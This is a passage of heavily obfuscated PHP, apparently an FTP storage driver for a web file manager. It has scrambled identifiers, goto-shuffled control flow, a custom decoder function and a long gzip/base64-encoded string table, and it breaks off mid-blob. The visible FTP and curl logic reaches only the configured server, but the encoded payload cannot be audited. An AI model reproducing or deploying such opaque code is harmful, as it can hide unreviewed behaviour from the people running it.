bëïè¦Ä™¬: $dÊÔ¬˜Ÿƒï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->_isconn()) { return !1; } $D±‘Ğ­õÛ = $aÊŠ­ä†åß = array(); goto bÜßñ‘È¹‹; D¢Ä‘ºÒ‚: } public function getContent($fè‘É‹âĞ) { if (!$this->_isconn()) { return !1; } $fè‘É‹âĞ = $this->iconvSystem($fè‘É‹âĞ); return $this->fileSubstr($fè‘É‹âĞ); } public function setContent($AÄ è¼¤ˆñ, $FàÔÛ‘¯†° = '') { goto f¢ÛÍ÷åˆÓ; b»‚ÛÎ‚: file_put_contents($A÷´Œã…¨ê, $FàÔÛ‘¯†°); $aº„¨“É„İ = $this->upload($AÄ è¼¤ˆñ, $this->iconvApp($A÷´Œã…¨ê)); $this->tempFileRemve($A÷´Œã…¨ê); goto C¯¬·è»³; C¯¬·è»³: return $aº„¨“É„İ; goto EÄÑ¾­‰”…; f¢ÛÍ÷åˆÓ: if (!$this->_isconn()) { return !1; } $bŸ—°·µ¡„ = $this->pathThis($this->iconvSystem($AÄ è¼¤ˆñ)); $A÷´Œã…¨ê = $this->tempFile($bŸ—°·µ¡„); goto b»‚ÛÎ‚; EÄÑ¾­‰”…: } public function fileSubstr($a®†Á»íìä, $c‘’–óÏ­ = 0, $d µô÷ğ‰† = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($a®†Á»íìä, $c‘’–óÏ­, $d µô÷ğ‰†); } private function ftpRequest($A‰¨¤ÎÇÂÅ, $CÎ“‡³œÈ = 0, $fÀ­‘Æ¦¥¡ = false) { goto Fö”ñƒ‹—Â; Fö”ñƒ‹—Â: $A‰¨¤ÎÇÂÅ = $this->iconvSystem($A‰¨¤ÎÇÂÅ); $FìâËÀ¬… = $this->scheme . $this->host . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][4] . $this->port; $a½ˆÌïàÛ¾ = curl_init(); goto a±´®‘‹–; fî£ëÃâÓÖ: curl_setopt($a½ˆÌïàÛ¾, CURLOPT_RETURNTRANSFER, 1); $f‹¡ääÂÂ = curl_exec($a½ˆÌïàÛ¾); curl_close($a½ˆÌïàÛ¾); goto c¢Î¤äŸ¸Û; c¢Î¤äŸ¸Û: return $f‹¡ääÂÂ; goto F‡ßæ´İ›Õ; a±´®‘‹–: curl_setopt($a½ˆÌïàÛ¾, CURLOPT_URL, $FìâËÀ¬… . $this->pathEncode($A‰¨¤ÎÇÂÅ)); curl_setopt($a½ˆÌïàÛ¾, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($fÀ­‘Æ¦¥¡) { $Aßë×Å» = $CÎ“‡³œÈ + $fÀ­‘Æ¦¥¡ - 1; curl_setopt($a½ˆÌïàÛ¾, CURLOPT_RANGE, "{$CÎ“‡³œÈ}\55{$Aßë×Å»}"); } goto fî£ëÃâÓÖ; F‡ßæ´İ›Õ: } public function upload($dÏ’Âèæà, $eš¥Ú¶ğ¹µ, $Aİ²•é®Òí = false, $eï««È³Œ‰ = REPEAT_REPLACE) { goto bâö‰ï…™; DÒ˜—ŒÁ: $eš¥Ú¶ğ¹µ = $this->iconvSystem($eš¥Ú¶ğ¹µ); $cƒê©÷½ÈÕ = ftp_nb_put($this->connect, $dÏ’Âèæà, $eš¥Ú¶ğ¹µ, FTP_BINARY); while ($cƒê©÷½ÈÕ == FTP_MOREDATA) { $cƒê©÷½ÈÕ = ftp_nb_continue($this->connect); } goto B™½¡¯ç‡Ø; bâö‰ï…™: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dÏ’Âèæà))) { return !1; } $dÏ’Âèæà = $this->iconvSystem($dÏ’Âèæà); goto DÒ˜—ŒÁ; B™½¡¯ç‡Ø: if ($cƒê©÷½ÈÕ != FTP_FINISHED) { return !1; } return $this->getPathOuter($dÏ’Âèæà); goto Eö¢‹‡ÒŸ°; Eö¢‹‡ÒŸ°: } public function download($EõÄÖ„ŠĞÂ, $dƒĞô²„Å = '') { goto e¸†‚‹ŠÏ—; b¡ öªÜò: while ($aÆÊí¬»«ğ == FTP_MOREDATA) { $aÆÊí¬»«ğ = ftp_nb_continue($this->connect); } if ($aÆÊí¬»«ğ != FTP_FINISHED) { return !1; } return $this->iconvApp($dƒĞô²„Å); goto dõ¬ãÎ; fÎî×ôºÇ£: $EõÄÖ„ŠĞÂ = $this->iconvSystem($EõÄÖ„ŠĞÂ); $dƒĞô²„Å = $this->iconvSystem($dƒĞô²„Å); $aÆÊí¬»«ğ = ftp_nb_get($this->connect, $dƒĞô²„Å, $EõÄÖ„ŠĞÂ, FTP_BINARY); goto b¡ öªÜò; e¸†‚‹ŠÏ—: if (!$this->_isconn()) { return !1; } $eÀÌòÜÖ™Ó = $this->pathFather($dƒĞô²„Å); if (!IO::mkdir($eÀÌòÜÖ™Ó)) { return !1; } goto fÎî×ôºÇ£; dõ¬ãÎ: } public function exist($dŒùùºœ¬) { return $this->isFile($dŒùùºœ¬) || $this->isFolder($dŒùùºœ¬); } public function isFile($DîÏƒÑÑå) { return !$this->isFolder($DîÏƒÑÑå) && $this->objectMeta($DîÏƒÑÑå); } public function isFolder($Eéô¢Ïæ·Ÿ) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][197], $Eéô¢Ïæ·Ÿ); } protected function objectMeta($d‘×¯Õæâ) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][198], $d‘×¯Õæâ); } protected function _objectMeta($fïëÉé‡Ú) { goto A•±×œĞĞ®; EĞÀÂ½Éù: $DÆ°ô¦Àù½ = @ftp_size($this->connect, $fïëÉé‡Ú); if ($DÆ°ô¦Àù½ != -1) { $eŸğêÚ™Ã[$eëÛÊ¬™¥[77]] = $DÆ°ô¦Àù½; } else { $E¢–êÈÙ¶ = @ftp_chdir($this->connect, $fïëÉé‡Ú); if (!$E¢–êÈÙ¶) { return !1; } $eŸğêÚ™Ã[$eëÛÊ¬™¥[29]] = $eëÛÊ¬™¥[76]; } return $eŸğêÚ™Ã; goto Cë¼”‚Ã©´; A•±×œĞĞ®: $eëÛÊ¬™¥ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($fïëÉé‡Ú == $eëÛÊ¬™¥[33] || $fïëÉé‡Ú == $eëÛÊ¬™¥[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto CÄ‚İÊéÕ; CÄ‚İÊéÕ: $fïëÉé‡Ú = $this->iconvSystem($fïëÉé‡Ú); $eŸğêÚ™Ã = array($eëÛÊ¬™¥[28] => $this->iconvApp($fïëÉé‡Ú), $eëÛÊ¬™¥[29] => $eëÛÊ¬™¥[173], $eëÛÊ¬™¥[77] => 0); @ftp_chdir($this->connect, $eëÛÊ¬™¥[8]); goto EĞÀÂ½Éù; Cë¼”‚Ã©´: } protected function _isFolder($EÈõÉâäÉ) { $fÌ™ÕÜ§«ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($EÈõÉâäÉ == $fÌ™ÕÜ§«ó[33] || $EÈõÉâäÉ == $fÌ™ÕÜ§«ó[8]) { return !0; } $A«µ”ƒ‰˜Â = $this->_objectMeta($EÈõÉâäÉ); return isset($A«µ”ƒ‰˜Â[$fÌ™ÕÜ§«ó[29]]) && $A«µ”ƒ‰˜Â[$fÌ™ÕÜ§«ó[29]] == $fÌ™ÕÜ§«ó[76] ? !0 : !1; } } goto f‰ŒàóÔ£’; aÛ¦Åá¾ğ¿: if (!function_exists('_kodDe')) { function _kodDe($BíÚÔê¶İè) { $BíÚÔê¶İè = base64_decode($BíÚÔê¶İè); $eø¾Âµ °Ø = strlen($BíÚÔê¶İè); $CÂƒ¢õÒÌ„ = ''; $B×è†…‹­Æ = ord($BíÚÔê¶İè[0]) - 30; for ($dËÌªÁ„Áê = 1; $dËÌªÁ„Áê < $eø¾Âµ °Ø; $dËÌªÁ„Áê += 2) { if ($dËÌªÁ„Áê + 1 < $eø¾Âµ °Ø) { $CÂƒ¢õÒÌ„ .= chr(ord($BíÚÔê¶İè[$dËÌªÁ„Áê + 1]) + $B×è†…‹­Æ); $CÂƒ¢õÒÌ„ .= chr(ord($BíÚÔê¶İè[$dËÌªÁ„Áê]) + $B×è†…‹­Æ); } else { $CÂƒ¢õÒÌ„ .= chr(ord($BíÚÔê¶İè[$dËÌªÁ„Áê]) + $B×è†…‹­Æ); } } return $CÂƒ¢õÒÌ„; } } define(strrev('£Ç¤ÔÊ‰¥â¬ó'), "\xa1\xa1\x88\xcb\x81\xa6\xdb\x9d\x9c"); $_SERVER[ó¬â¥‰ÊÔ¤Ç£] = explode("\x7c\x1\x7c\x1\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x54\xd5\xd5\x38\x6e\xa8\xb8\x61\xab\xb5\x15\x97\x47\x4\xb3\x30\x4b\xc2\x4e\x20\x84\x49\x32\x49\x6\x26\x99\x38\x33\x61\xd".base64_decode('DG9m3mReMjNv8t6bbICWVkVBcEFxwWrFrVoBUXEruLSg1t1q3RVbIEhpFXGh')."\124\321\357\356\367\276\67\203\375\276\337\377\217\302\334\375\335\345\334\163\317\71\367\234\163\267\254\171\176\361\121\360\277\345\233\377\361\341\273\70\10\376\73\172\361"."\261\70\164\376\212\23\6\241\77\307\254\130\136\122\322\70\176\310\250\346\223\257\176\144\275\374\200\174\277\174\145\300\377\322\313\276\123\136\175\140\272\167\340\316\227".base64_decode('+gaOGvT9ppd2VoLCuG4l/pEymikpvaphGjghpmUSajsOqxn868Y/RldKNRUc')."\216\64\7\302\221\120\153\113\213\67\30\216\220\26\305\374\264\26\47\241\254\254\313\151\322\170\126\321\15\360\51\261\271\110\126\313\52\31\113\12\117\210\313\246\34"."\225\15\322\122\135\115\244\316\333\342\17\314\211\204\347\264\170\111\211\150\244\53\247\350\175\70\206\202\41\123\326\315\260\232\126\130\211\36\235\365\253\306\333\340\153"."\x96\xc2\x41\x4f\x73\xc8\x53\x1b\xf6\x5\x9a\x71\x72\x6d\xa0\xa9\xc9\x17\xce\x4f\xf\x6\xfc\xfe\x1a\x4f\xed\x8c\xfc\x9c\x96\xa0\xa7\xa1\xc9\x23\x81\xfe\xa5\x94\x88\x9a\x49\x68\x25"."\xd2\x42\x9c\xb3\x50\x2a\xc5\x81\x7a\x55\x49\xc5\x71\x30\x23\xd3\xee\x98\x7d\x59\x12\xa\xb3\x10\x58\x83\x4c\x2e\x95\xc2\x91\x66\x16\x22\xfd\x57\x12\x72\x2e\x45\xe6\xac\x4e\x8c\x64"."\x75\x35\x2d\xd3\xa1\xcf\x50\xfa\x58\x2a\xe\xc8\x39\x53\x53\x33\x31\x1c\xf1\xf6\x9a\xba\xcc\xd3\x41\x8f\x63\xba\x92\x56\x32\xa4\xa9\x90\xd7\xef\xad\xd\x4b\xb0\x9b\x52\x7d\x30\xd0".base64_decode('JJGlSMuGqejSrEZv0CvBrlcVoxEXS7heazOYEMnj90tHasFU0lnaDK5ToLFA').strrev('‘wF,¼‡×Ô	:\\~Áˆ0oUĞ¦° \\e­:Zb|Hæj”Î°')."\364\144\14\201\122\113\54\236\110\231\221\156\71\225\243\300\332\211\177\213\311\17\371\325\14\2\300\135\152\106\315\21\140\45\115\150\32\333\71\44\220\243\245\25\232"."\222\6\325\64\262\247\300\6\353\306\301\252\251\370\167\62\51\24\215\300\74\105\67\43\112\46\246\305\325\14\331\206\325\144\313\21\300\223\315\144\235\256\202\162\244"."\101\315\25\323\262\175\115\132\67\31\103\102\115\51\176\266\313\22\132\52\256\350\74\236\5\325\305\34\62\30\265\137\250\335\234\113\213\105\130\64\226\124\123\161\235"."\156\316\37\53\11\266\277\232\350\343\233\320\320\162\172\114\361\201\155\302\353\266\260\236\124\220\102\212\151\202\101\33\164\134\255\331\224\46\307\103\212\56\214\265\36".base64_decode('VAzkTDExh4rVa3q6DqAL8n2wSdTWAhmddJvEhSl04R93ybylzu/nz5sG/ikl')."\70\257\215\164\55\251\244\122\21\245\127\41\333\51\35\37\147\320\261\272\215\250\232\161\203\24\34\365\5\42\111\331\110\66\305\307\105\120\55\322\363\114\134\351\165".strrev(''."\n".'BŠ²Âh2zÒ#!	Ã‰’Ùši8qHâS“”ä +Ó5šupîÍ½ÛåY“e').strrev('™œª®X:ÊKšE&I¯JâDS%ìÑ,¥ˆX§LVƒJÕ+‘Í$Ô¸¤9Õ')."\160\116\304\211\162\66\233\122\143\262\251\152\31\267\26\63\25\323\151\230\272\42\223\326\74\261\230\142\30\316\132\55\143\352\132\312\351\111\245\264\36\147\100\127\333".strrev('=`JTÓd½;¢„Œg.´¬“İşBñ°‚Y4[½’V1Í°LÀË†T¥LÕ')."\x5e\xa4\xc5\xea\x54\x23\xab\x19\x2a\xec\x5e\xa5\x24\x9b\xa6\x1c\x4b\x42\x9c\xc2\x9b\xaf\xfa\x91\xf2\x6a\x26\xa5\x66\x94\xbc\xb2\xde\xde\xac\xaa\x2b\x6\xed\xab\xd4\xd0\x14\x26\x8d"."\200\326\25\147\213\56\267\247\345\112\51\233\213\202\231\41\273\267\100\32\56\115\246\246\122\212\301\250\103\112\347\14\323\251\53\0\71\251\340\30\44\153\354\113\70".base64_decode('m+DWUpW4MwRwOEkeUz5WAmAj0Tyc2hgOt0R89eCobvZGmjzh2kbSbVNup332')."\x3\xcc\xcc\x9a\xa4\x89\xb3\x9d\x60\x8b\x41\xc0\x6a\x6\x63\xe5\x89\x2d\x5a\x8f\xa2\x83\xf\xd7\xf4\x55\x4a\x9d\x5a\x3c\xaa\xf5\xba\x68\x16\x2c\x1c\x2\x38\x84\x16\x86\xcb\x9d\x35"."\x9d\x41\x39\xd3\xe\xe7\x27\xda\x67\x2a\x4\xfc\x8c\xee\x76\xeb\x44\xfb\x95\x4c\xbb\x99\xa4\x15\x43\xde\xe0\x4c\x6f\x30\x12\xa\xd4\x87\x67\x79\x82\xe4\x90\xcf\x0\x28\xe9\xa5\x9f"."\x82\x4d\xa7\x9c\x41\x25\xe\xa6\x3e\x66\xd2\x7a\x72\x16\xce\x1a\x2d\x3\x37\x6\x5c\x2b\x9a\xb\x37\xb\xcd\xf3\xfb\x1a\xe0\xc4\xd4\x39\xd\x50\xc8\x29\x96\xa2\x6d\xfb\xd5\xb4\xa"."\373\156\262\34\64\223\200\2\150\40\35\162\243\1\125\265\45\313\112\332\342\243\112\235\340\337\262\322\171\155\165\256\262\371\325\156\225\327\161\127\270\52\244\321\345"."\343\245\26\100\222\250\162\112\42\203\316\53\121\56\5\146\374\310\4\300\23\113\330\326\266\251\303\211\101\357\105\255\336\120\70\322\344\15\67\6\352\310\27\274\36"."\22\362\153\170\153\322\21\315\303\77\363\311\12\46\60\132\365\245\345\166\33\226\206\261\46\115\127\254\51\144\55\301\212\317\122\343\24\215\303\150\243\242\266\47\311"."\xf8\x54\xd8\x5a\x4c\x4b\x69\xba\x9c\x82\x58\x8c\x2\xb1\x42\x31\x4b\xbb\x9a\x20\xeb\x83\x11\x26\x8f\x84\xd4\x74\x96\xe2\x35\x33\x99\x4b\x47\x85\xa0\x9b\x77\x85\x7c\x17\xac\x3c\x3d".base64_decode('aJIaO+g0nYQq3aTKyNH1ZBsF3KEx4H+OkONaWqbkLkJOShxjJ5xUZslpVGR+')."\x72\x9a\xba\xa9\xc1\x54\xdd\x52\xa4\x49\x31\x93\x1a\x59\xae\x76\x85\x76\x29\xc7\xfa\x46\x7b\x19\x57\x52\xa\x9d\x97\xa4\x42\x91\x3b\xa0\xe1\xba\xd9\x74\x1\x42\xd\x84\xf9\x59\xaa".strrev('¶ì•	+¢ß/2¯ yCD~§ÔjˆñÁ>À;D	àSEdÁ<·Ò>4NPA')."\xc\x58\xaa\x26\x59\xef\xa4\x15\xc0\xd2\xf0\xf3\x6\x46\x84\xc6\xea\x5b\xfd\xfe\x48\x6d\xa0\x39\xc\x68\x66\x9c\x32\x2b\xe8\xb\x7b\x29\x70\x7a\xea\x22\x9e\xda\x16\x1c\x4b\x8b\x4b"."\115\12\100\114\141\205\156\116\37\167\217\46\3\203\107\20\77\253\70\26\47\23\201\260\64\16\3\264\234\325\62\206\342\214\221\326\342\34\237\343\22\223\155\310\74"."\257\6\247\324\173\235\162\272\337\231\6\323\344\144\135\267\36\255\22\101\374\370\204\366\221\145\344\170\33\116\54\140\204\350\231\336\22\10\221\12\325\60\25\220\115"."\x51\x45\x27\xfd\x68\x69\x25\x59\x69\x1\x84\x1a\xbc\x24\x71\x8\x81\xba\xa4\x5c\x41\xe0\x6d\x56\x88\xe2\xdc\x1c\x28\xaf\xab\xfd\x32\x1f\x63\x35\xed\xf\x69\xbb\x37\x9d\xe2\x94\xa0"."\x75\x54\x4e\xbe\x16\xe1\x46\x5f\xf3\x8c\x48\x53\xa0\xce\xeb\x8f\xf8\x9a\x1\x42\xa\xe7\xa7\xb7\xb6\xd4\x79\xe8\xe2\x8a\xe9\x35\x81\x70\xa3\x25\xb5\x15\xa0\xa4\x99\x1e\xbf\xcf\x5e"."\334\73\333\27\12\207\12\146\201\264\126\257\55\7\360\176\55\101\157\275\157\66\213\326\373\274\376\272\120\244\326\123\333\310\313\64\173\232\110\44\222\200\334\227\341"."\xb6\x96\x8f\x0\xdc\x1a\x62\x3c\x5c\xa4\x1b\xf2\xa3\x74\xb2\x22\x16\x86\x29\x42\x59\x81\x8\x87\x3\x70\x4e\x2a\x4\xf6\xc8\x70\x21\x17\x8c\x46\x42\x88\xf3\x98\x96\xa3\xd0\xc8\xe8"."\303\64\105\42\151\231\154\53\231\236\201\45\370\247\124\362\204\44\63\113\332\0\350\42\332\307\202\150\30\64\16\50\101\362\175\211\340\371\274\36\104\140\231\32\45"."\xc1\x50\x76\xe1\x4\x4f\xc2\x64\x58\xc0\x16\x7\xfb\x82\xe7\x81\x15\xf0\x20\x76\x1b\x40\x2\x5a\x91\x8\xdd\x6b\x6\x60\x54\x3c\xb4\x3b\x9\xce\xea\x46\x2\x2d\xde\xa0\x7\x32\xca"."\221\131\301\100\163\3\251\320\223\124\150\7\174\144\372\113\50\335\104\370\145\223\243\60\100\364\310\224\167\342\223\336\241\321\251\134\214\177\56\304\77\200\336\43\37".strrev('½ƒäQŸ"—¤A‡vœ`>£ÁH_#MQkìrÕâ(°!™@Ä3y£Öt2W').base64_decode('5AAJB2Z4myMUsnBMgEacAHjXQJBMiKl1Uk4KZwa9IbrLdaUrp9LpcrtGEShW').base64_decode('wBlFPu9e0NYzqmSec5RrPgiUlk3DURJrc1miI0j9nM5qQ4qoxKgurWxzt7lL')."\252\53\347\171\234\375\262\263\277\334\71\311\71\177\124\233\253\164\24\111\230\277\150\264\143\354\22\130\0\24\254\276\140\76\370\251\152\253\36\331\346\274\360\342\205"."\323\346\265\315\57\256\34\65\274\315\165\101\133\317\374\262\322\152\372\235\130\116\7\134\142\254\217\165\65\76\252\4\164\11\120\112\254\110\6\241\74\241\0\315\350".base64_decode('V7M8ddH4JTQdrKHSzmvMc7aNml8t1BOS7N8CVBLAv0lWzuOcC0fGqsJ9T+Aj')."\x97\x89\x71\xec\x9\xf7\x45\x54\x8e\x11\x3c\xa0\xb6\x67\xd8\x16\x2\x87\x3e\xe3\xce\xad\x4\xfa\xa2\x91\xf8\x77\x9\x5d\xc8\x76\x85\x6c\x7a\x24\x58\xd3\x9\x74\xe6\x32\x6a\x17\x95".base64_decode('OWSULhLQTArfUcXsUSh4gHRLHAAH5QhBlhBLIXqQfIFzZgpiU8goshFIjPWw')."\x58\x5c\xc9\x90\x75\x3a\x91\x94\x36\x62\x72\x56\x9\x9\x23\x8c\x44\xc2\x9e\x1a\xbf\x37\x42\x31\xc\xc1\xc4\x34\x8e\xb0\x62\xd\x93\xd2\x81\xa1\x71\x8c\x4a\xf1\x43\x8c\x53\xe7\x88"."\21\41\73\337\350\112\111\10\61\110\212\256\153\172\45\222\106\32\271\54\244\335\0\323\145\202\271\225\0\307\56\125\115\225\360\224\223\172\21\161\1\262\62\245\34"."\40\23\315\250\1\167\111\133\133\156\236\22\237\77\17\0\265\354\114\314\137\64\146\111\51\45\316\335\155\340\17\215\140\134\106\172\237\345\153\151\0\332\214\122\116".base64_decode('ngJCswjDhrALTPah6YwmylrIaVMz5RQrBvPCMIWsHTuXiSgAL6afIyR4Ugsi')."\105\204\55\233\231\274\214\11\66\4\151\26\110\163\10\121\374\137\25\341\347\23\152\6\154\212\132\341\300\302\342\227\120\237\141\52\151\213\240\321\120\144\75\226\254"."\317\245\122\46\243\335\123\152\47\151\226\100\374\302\102\145\353\65\75\146\131\167\176\342\65\170\0\155\21\226\112\212\11\155\135\126\54\371\232\245\232\100\300\357\365"."\64\113\360\170\45\307\202\257\316\111\133\230\355\364\21\176\206\5\124\112\62\313\0\345\230\64\225\310\233\150\31\13\241\152\312\72\70\127\71\165\11\351\100\101\26".strrev('Ú,¢íGÌˆu¡Î¯ “­àìi;F[…ÁÜ*pq¯À;îx0ÅÔf')."\x67\x33\x9\xe5\xc\x29\xb9\xcf\x81\xfb\xef\x57\xba\x95\x94\x83\xf6\xde\x41\x7\xe5\xa0\x23\x70\x20\x6\xac\x8e\xf4\xa6\x15\xc0\x2d\xe9\xd\xa\x2\x44\x96\x74\x40\x30\x81\x30\xe7"."\xe0\x32\x37\x7\x9d\x6\xc6\x28\x38\x38\x13\xe1\x68\xd7\xb5\x5c\xb6\x85\x7e\x49\x88\xe1\xce\x90\x4\xde\x53\x96\x10\xd4\x34\xd3\x41\x39\x42\x47\x3e\xb3\x8\xbb\xc3\x43\x33\x39\x20"."\362\336\23\310\146\103\300\161\173\37\160\52\314\257\227\273\305\5\56\270\330\31\53\140\160\221\62\27\175\162\222\316\316\134\331\5\227\360\243\141\271\75\44\174\316"."\x94\xdb\xe9\xb7\xa\xe4\xe2\x70\x50\x89\xf5\xc5\x38\x83\x56\x27\x70\x79\xd6\x18\x5b\x6a\x4\x77\x85\x80\xa7\xf0\x52\x33\x80\x60\xb0\x35\xe4\xc4\x13\x29\x24\x53\x28\x61\xe0\x63\x1"."\256\43\102\63\37\123\40\313\117\101\210\230\102\0\37\13\250\207\46\5\70\246\313\221\123\133\66\10\375\14\245\221\44\244\320\64\241\377\164\364\226\166\141\224\357"."\x44\x3a\x44\x9\x36\x40\x2a\xa0\x73\x4\x42\x99\x93\x2f\xa9\x10\x25\x3f\xaa\x16\xc1\xf3\x1a\x49\x33\xd6\x96\x4d\xb4\xd\x29\xc2\x79\x6f\x51\x33\x7d\x6a\x46\x94\x39\xf0\x54\xd2\x73".base64_decode('sqk4ONukJHVHCmNcwmUaDiLrcABetVPAvpyvBr2HVYW+k5ZsPacbjgy6FTBq')."\21\33\140\22\220\114\312\72\237\123\272\203\40\30\163\111\16\54\302\243\102\261\204\334\315\17\31\113\35\141\37\30\146\37\23\306\10\101\153\243\70\132\167\244\110"."\x23\xe3\x3f\xb\x45\xc5\x2d\xa6\x1a\x7e\x30\x77\x85\xc2\x68\xa4\x61\xad\x60\x14\x4a\x45\x68\x58\x43\xf0\x4d\xaf\x6b\x20\xc1\x22\x1\x52\x85\xa\xb\x29\xe7\x11\xb1\x49\x38\x40\x54".strrev('f42Å¢‚Ï¨íe'."\n".'PâvšÛÃIÑŸ'."\r".'+Üu€)\\Ğaçû‚Eˆ°X')."\107\322\266\124\133\224\177\324\202\176\370\226\262\264\102\245\147\345\4\370\343\200\241\165\351\30\301\271\0\65\104\356\303\34\345\302\251\306\167\361\42\3\321\23\4"."\x21\x2e\xb1\xcd\x8e\x9\x38\xaf\xa8\xac\xbb\x74\xd0\x23\xde\x51\x7e\x12\x10\x5a\x28\xc7\x12\xe6\xdb\x4b\xe0\xe6\xfd\x1a\x25\xd3\xe1\xae\xf0\xc6\x55\x13\xa6\x40\xa4\xa6\x51\x99\x1b"."\57\50\134\113\261\64\241\101\64\45\256\274\65\340\4\217\143\244\245\144\41\204\356\52\103\70\330\305\217\34\361\300\22\157\336\340\335\35\16\11\267\324\151\166\231"."\x87\x12\x5d\x86\xa9\x65\x79\x8e\x10\xc5\xd9\x42\x16\x6f\x54\x28\xc5\xa6\x1b\xf5\x9\xa0\xfe\x38\x22\x4\xf8\xa4\xa1\xb2\xa4\x2e\x22\xe7\x31\x38\xbb\x52\xa0\x84\x20\x21\xf6\xd5\x79".base64_decode('dJ2CBR4QlB2CRDEJ7twQFXkWQsW4cW83v33GTcEPu/DJ5JLj8QCV5Ynh/KKi')."\150\243\160\103\110\41\200\65\45\304\12\27\367\244\122\374\276\320\36\77\142\25\274\73\305\112\142\312\21\253\325\43\52\234\12\366\13\245\61\342\115\104\105\126\232"."\x95\xdf\xde\xda\x69\x5b\x2b\xba\xf9\x6f\x74\x57\x1e\xcc\xf3\x5\x2d\x1c\x87\x18\x31\xa9\x66\x14\x83\x1d\x49\xba\x51\x60\xc4\x10\x32\x8f\xb4\x4c\x30\x4f\x10\x3e\x1\xfe\xa\x24\x88".base64_decode('2J5JWDgSEA40dDhETMtRHERtCKBqmX2wNfBM1uta2hcAoF8YHuzlFCpjQhim')."\127\55\64\120\260\176\360\110\70\122\233\64\233\65\305\317\217\53\57\337\377\40\16\175\261\354\341\203\167\221\365\210\305\315\150\147\7\216\54\76\206\374\75\112\124"."\xfc\xb9\x6c\xf6\xbe\xcc\xce\xe7\xce\xac\xbf\xf6\xac\xf7\x3e\xbc\x6a\xe5\xb0\xce\xdc\x1d\x23\x37\xed\xfd\xd9\xb5\xb9\x4d\xbb\x6f\x70\xce\xbb\x6e\xeb\xda\xa6\x87\xb7\x5d\x73\xce\xf2".base64_decode('Ry4/Z/k509esrfZ8EP/yAu/ye6aFHkn++mfJpePfG+T8yQjPjnsWTNbeGN6X').strrev('=2+úÂ{ßOìñ\\7‹ãí9¿Õi¶·âÃûÿÕ·ŸÒu¾_WöÊiØìh').base64_decode('u+nSUfXTb/7J/ReM/uOXJyx74K7YisHZdxf8IrN5zsyvBs8MTX/h6PoT5/99').strrev('¼Ÿ]êÿ]K]Ìäœæ¢·T\\«)—‡çpı_İÒş~…÷uM—ğ9/¾‡ãĞ')."\x79\xdf\xe3\xeb\xa5\xb6\x97\x16\x9e\xfa\xf5\xfb\xdf\x8d\x75\x14\xad\xb8\x72\xe5\xe0\x95\x53\x6\xff\xa4\xfe\xaa\xc1\x35\xab\xb6\x3c\xfe\xf7\xef\x57\xbf\x21\x3d\xe3\x52\x66\x77\x34".base64_decode('ljsuu/bVe7NjT3h9+klXxj6Z8uz2Z89ovyo5Qsl+eOuw+o92rv6sd91vrvpP')."\351\337\126\355\274\371\337\133\166\175\360\375\271\175\33\267\254\70\355\350\333\57\137\370\342\240\300\270\263\52\376\364\366\135\33\172\76\166\150\367\45\367\255\333\374"."\365\376\173\173\36\171\154\374\322\343\27\177\227\254\10\71\77\152\171\361\314\353\203\237\276\370\354\15\267\314\15\75\370\206\277\364\302\107\317\71\355\322\311\77\357".strrev('†Òï,L¯ÓõİÒÓòÚÿãŒäÔÌø¦º_¯\'ËÔüıÏËû÷õÿn“ßG½³Ëş')."\75\131\226\231\177\353\37\352\66\277\376\350\72\351\361\141\213\316\132\65\167\326\137\227\277\361\273\273\256\137\70\360\376\362\216\267\366\335\263\371\224\362\133\67\254"."\311\155\176\73\234\173\366\371\233\234\153\132\357\176\340\202\326\243\246\126\374\162\372\111\307\273\147\274\165\165\327\351\77\173\60\372\367\335\376\131\373\132\137\172\340"."\106\343\333\23\167\367\236\323\160\371\322\332\362\361\167\366\256\172\51\267\71\270\176\346\227\215\256\273\157\137\372\323\207\156\253\275\353\352\73\127\354\176\53\71\363"."\xe4\xbf\x96\x1d\xa3\x4f\x6e\x38\x76\x7d\xf6\x9a\x9a\xad\x97\x9e\xb2\xf6\xb3\x93\xde\xde\x36\xe7\xa6\x27\xe7\x5e\xd4\xf9\xee\xb1\x7f\x30\x7a\x7f\x59\xfb\xfc\xef\xaf\x91\x7b\x6e\xba"."\342\324\213\256\74\352\31\371\41\363\212\266\133\157\357\311\236\60\241\377\347\153\323\303\206\75\374\150\335\332\323\7\277\175\321\63\303\323\203\116\73\377\262\277\135".base64_decode('N3igpOjB7dsXXL/KseyYjac95pq0bfHY7ceUXdB6zb9Xjqk/vPjVT4ddps6b')."\x5d\xf1\x9b\xcf\x2a\xce\x7a\x64\xe7\x9\x3\x97\x1f\xb3\xec\xf\x2f\xc\x5f\x7d\x83\x7b\xdd\xb\xe6\xb9\x5a\x34\x76\xc7\x47\xd7\x2f\xbb\xa6\x7a\xdd\xf5\xca\x90\x87\x7\xed\xbc\xc3"."\x1d\xfb\x4b\xfd\x51\xb7\xbd\x7e\xcc\x87\x45\x53\x4e\x6b\xfa\xf7\xdc\xcf\x3e\x39\xb6\xe9\xa7\xf\xbd\x7e\xcb\x7b\x8b\x56\xa9\xcb\xef\x3c\x6f\xc1\x6d\xd9\xc7\xe\x96\x54\x5c\x76\xcc"."\xd2\xb7\xe\x1c\x3e\xf9\x8d\x49\x1f\x35\x6d\xcb\x5e\x3d\x78\xca\x7f\x16\x36\xdf\x78\xde\x1d\x2f\x2c\xfe\xf4\xdf\xc7\x3c\x9f\x1b\x72\xde\xd9\x72\x4c\xb9\x66\xcb\x5d\x7d\xfa\xda\x85"."\x23\xd6\x7d\x70\xcf\x8c\x53\x8b\xa6\x64\xb7\xcc\xb9\x56\x5f\x98\xd9\x73\xfd\x55\xef\x18\xef\x37\x9e\xfd\xf4\xe2\x95\xfa\xb1\x9f\x35\x75\xf7\xcc\xbf\x7d\xfd\x53\x2b\x5e\xc9\xdc\xba"."\xe3\x9d\x8a\x1b\xfa\x8a\xee\xee\xda\xbd\xf7\x3f\xdf\x4d\x8b\x6e\xff\xed\x6d\xbb\xfd\xf2\xb9\x63\x6\x7a\xdf\xac\x7